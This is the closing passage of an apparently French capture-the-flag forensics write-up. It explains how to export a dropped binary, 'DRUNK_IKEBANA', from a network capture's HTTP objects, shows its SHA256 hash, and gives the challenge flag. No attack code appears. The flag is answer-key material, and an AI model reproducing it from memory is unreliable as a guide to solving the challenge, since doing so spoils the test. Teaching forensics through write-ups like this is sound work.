d&rsquo;un binaire &ldquo;DRUNK_IKEBANA&rdquo; et le place dans le dossier /usr/bin/phar.bak. Il est possible de récupérer le binaire:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://i.imgur.com/d6xdZeN.png data-srcset="https://i.imgur.com/d6xdZeN.png, https://i.imgur.com/d6xdZeN.png 1.5x, https://i.imgur.com/d6xdZeN.png 2x" data-sizes=auto alt=https://i.imgur.com/d6xdZeN.png title=https://i.imgur.com/d6xdZeN.png></p><p>Il est possible d&rsquo;exporter le binaire via le menu File > Export Objects > HTTP > DRUNK_IKEBANA</p><p>Et voilà, pour valider l&rsquo;épreuve, il suffit de trouver le SHA256 du binaire:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sha256sum DRUNK_IKEBANA 
</span></span><span class=line><span class=cl>daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830  DRUNK_IKEBANA
</span></span></code></pre></td></tr></table></div></div><h3 id=flag>Flag</h3><blockquote><p>SANTA{daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>